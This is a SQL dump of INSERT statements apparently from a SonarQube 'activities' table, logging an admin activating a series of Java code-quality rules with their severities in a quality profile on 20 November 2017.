INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2140, '2017-11-20 11:14:40.708', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1450;ruleKey=squid:S1450;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyfEbbGRdfPp-q_A');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2141, '2017-11-20 11:14:40.736', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1452;ruleKey=squid:S1452;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyfgbbGRdfPp-q_B');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2142, '2017-11-20 11:14:40.761', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1479;ruleKey=squid:S1479;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;param_maximum=30;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyf5bbGRdfPp-q_C');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2143, '2017-11-20 11:14:40.787', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1481;ruleKey=squid:S1481;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIygTbbGRdfPp-q_D');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2144, '2017-11-20 11:14:40.807', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1488;ruleKey=squid:S1488;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIygnbbGRdfPp-q_E');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2145, '2017-11-20 11:14:40.824', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1596;ruleKey=squid:S1596;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyg4bbGRdfPp-q_F');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2146, '2017-11-20 11:14:40.849', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1598;ruleKey=squid:S1598;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyhRbbGRdfPp-q_G');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2147, '2017-11-20 11:14:40.877', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1602;ruleKey=squid:S1602;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyhtbbGRdfPp-q_H');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2148, '2017-11-20 11:14:40.905', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1604;ruleKey=squid:S1604;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyiJbbGRdfPp-q_I');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2149, '2017-11-20 11:14:40.932', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1607;ruleKey=squid:S1607;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyikbbGRdfPp-q_J');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2150, '2017-11-20 11:14:40.96', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1610;ruleKey=squid:S1610;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyjAbbGRdfPp-q_K');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2151, '2017-11-20 11:14:41.004', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1611;ruleKey=squid:S1611;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyjsbbGRdfPp-q_L');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2152, '2017-11-20 11:14:41.082', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1612;ruleKey=squid:S1612;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyk6bbGRdfPp-q_M');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2153, '2017-11-20 11:14:41.197', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1640;ruleKey=squid:S1640;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIymtbbGRdfPp-q_N');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2154, '2017-11-20 11:14:41.268', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1643;ruleKey=squid:S1643;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyn0bbGRdfPp-q_O');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2155, '2017-11-20 11:14:41.43', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1656;ruleKey=squid:S1656;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyqWbbGRdfPp-q_P');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2156, '2017-11-20 11:14:41.467', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1659;ruleKey=squid:S1659;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyq7bbGRdfPp-q_Q');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2157, '2017-11-20 11:14:41.502', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1700;ruleKey=squid:S1700;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyrebbGRdfPp-q_R');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2158, '2017-11-20 11:14:41.53', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1710;ruleKey=squid:S1710;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyr6bbGRdfPp-q_S');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2159, '2017-11-20 11:14:41.556', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1751;ruleKey=squid:S1751;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIysUbbGRdfPp-q_T');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2160, '2017-11-20 11:14:41.581', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1764;ruleKey=squid:S1764;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIystbbGRdfPp-q_U');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2161, '2017-11-20 11:14:41.608', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1844;ruleKey=squid:S1844;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIytIbbGRdfPp-q_V');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2162, '2017-11-20 11:14:41.633', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1845;ruleKey=squid:S1845;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIythbbGRdfPp-q_W');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2163, '2017-11-20 11:14:41.661', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1849;ruleKey=squid:S1849;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyt9bbGRdfPp-q_X');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2164, '2017-11-20 11:14:41.687', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1854;ruleKey=squid:S1854;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyuXbbGRdfPp-q_Y');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2165, '2017-11-20 11:14:41.714', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1858;ruleKey=squid:S1858;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyuybbGRdfPp-q_Z');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2166, '2017-11-20 11:14:41.75', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1860;ruleKey=squid:S1860;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyvWbbGRdfPp-q_a');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2167, '2017-11-20 11:14:41.809', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1862;ruleKey=squid:S1862;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIywRbbGRdfPp-q_b');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2168, '2017-11-20 11:14:41.85', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1871;ruleKey=squid:S1871;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyw6bbGRdfPp-q_c');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2169, '2017-11-20 11:14:41.896', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1872;ruleKey=squid:S1872;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyxobbGRdfPp-q_d');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2170, '2017-11-20 11:14:41.944', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1905;ruleKey=squid:S1905;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyyYbbGRdfPp-q_e');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2171, '2017-11-20 11:14:41.979', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1940;ruleKey=squid:S1940;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyy7bbGRdfPp-q_f');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2172, '2017-11-20 11:14:42.029', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1948;ruleKey=squid:S1948;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyztbbGRdfPp-q_g');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2173, '2017-11-20 11:14:42.058', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1989;ruleKey=squid:S1989;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIy0KbbGRdfPp-q_h');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2174, '2017-11-20 11:14:42.085', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1994;ruleKey=squid:S1994;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIy0lbbGRdfPp-q_i');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2175, '2017-11-20 11:14:42.128', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2055;ruleKey=squid:S2055;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIy1QbbGRdfPp-q_j');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2176, '2017-11-20 11:14:42.171', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2060;ruleKey=squid:S2060;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIy17bbGRdfPp-q_k');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2177, '2017-11-20 11:14:42.215', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2061;ruleKey=squid:S2061;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIy2nbbGRdfPp-q_l');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2178, '2017-11-20 11:14:42.259', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2062;ruleKey=squid:S2062;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIy3TbbGRdfPp-q_m');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2179, '2017-11-20 11:14:42.304', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2065;ruleKey=squid:S2065;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIy4AbbGRdfPp-q_n');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2180, '2017-11-20 11:14:42.347', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2066;ruleKey=squid:S2066;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIy4rbbGRdfPp-q_o');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2181, '2017-11-20 11:14:42.409', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2068;ruleKey=squid:S2068;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIy5pbbGRdfPp-q_p');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2182, '2017-11-20 11:14:42.458', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2077;ruleKey=squid:S2077;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIy6abbGRdfPp-q_q');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2183, '2017-11-20 11:14:42.503', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2092;ruleKey=squid:S2092;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIy7HbbGRdfPp-q_r');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2184, '2017-11-20 11:14:42.542', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2093;ruleKey=squid:S2093;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIy7ubbGRdfPp-q_s');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2185, '2017-11-20 11:14:42.584', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2094;ruleKey=squid:S2094;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIy8YbbGRdfPp-q_t');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2186, '2017-11-20 11:14:42.617', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2095;ruleKey=squid:S2095;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;param_excludedResourceTypes=;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIy85bbGRdfPp-q_u');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2187, '2017-11-20 11:14:42.647', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2097;ruleKey=squid:S2097;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIy9XbbGRdfPp-q_v');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2188, '2017-11-20 11:14:42.681', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2109;ruleKey=squid:S2109;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIy95bbGRdfPp-q_w');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2189, '2017-11-20 11:14:42.717', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2110;ruleKey=squid:S2110;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIy-dbbGRdfPp-q_x');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2190, '2017-11-20 11:14:42.768', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2111;ruleKey=squid:S2111;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIy_QbbGRdfPp-q_y');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2191, '2017-11-20 11:14:42.792', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2112;ruleKey=squid:S2112;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIy_obbGRdfPp-q_z');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2192, '2017-11-20 11:14:42.82', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2114;ruleKey=squid:S2114;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzAEbbGRdfPp-q_0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2193, '2017-11-20 11:14:42.847', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2116;ruleKey=squid:S2116;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzAfbbGRdfPp-q_1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2194, '2017-11-20 11:14:42.882', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2118;ruleKey=squid:S2118;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzBCbbGRdfPp-q_2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2195, '2017-11-20 11:14:42.908', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2122;ruleKey=squid:S2122;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzBcbbGRdfPp-q_3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2196, '2017-11-20 11:14:42.942', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2123;ruleKey=squid:S2123;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzB-bbGRdfPp-q_4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2197, '2017-11-20 11:14:42.958', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2127;ruleKey=squid:S2127;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzCObbGRdfPp-q_5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2198, '2017-11-20 11:14:42.997', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2129;ruleKey=squid:S2129;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzC1bbGRdfPp-q_6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2199, '2017-11-20 11:14:43.066', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2130;ruleKey=squid:S2130;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzD6bbGRdfPp-q_7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2200, '2017-11-20 11:14:43.124', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2131;ruleKey=squid:S2131;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzE0bbGRdfPp-q_8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2201, '2017-11-20 11:14:43.212', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S2133;ruleKey=squid:S2133;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIzGMbbGRdfPp-q_9');
